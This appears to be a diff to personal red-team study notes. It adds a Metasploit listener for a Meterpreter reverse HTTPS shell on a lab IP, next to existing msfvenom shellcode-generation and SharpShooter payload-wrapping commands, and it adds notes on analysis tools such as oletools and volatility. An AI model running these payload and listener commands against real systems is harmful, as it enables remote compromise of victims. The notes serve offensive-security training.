@@ -103,6 +103,17 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.232.134 LPORT=4444 -f raw -b '\x00' -e x86/shikata_ga_nai -o shellcode.bin
 ```
+```
+msfconsole
+use exploit/multi/handler
+options
+set payload windows/meterpreter/reverse_https
+set lhost 192.168.232.134
+set lport 4444
+options
+exploit
+```
+
 
 - ct framework metasploit framework 
 
@@ -115,6 +126,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.232.134 LPORT=4444 -
 - LOLBin
 - shellcode, doesn't need external depenaces,
 - excel 4.0 code.
+- volatility tool
 
 
 ### Invoke-Obfuscation
@@ -138,3 +150,12 @@ https://github.com/mdsecactivebreach/SharpShooter
 ```
 python Sharpshooter.py --payload slk --rawscfile /tnp/shellcode.bin  --output test
 ```
+
+### ole tools
+
+oletools is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis, forensics and debugging. It is based on the olefile parser. See here for more info.
+
+https://github.com/decalage2/oletools
+
+### Code Execution and Persistance 
+
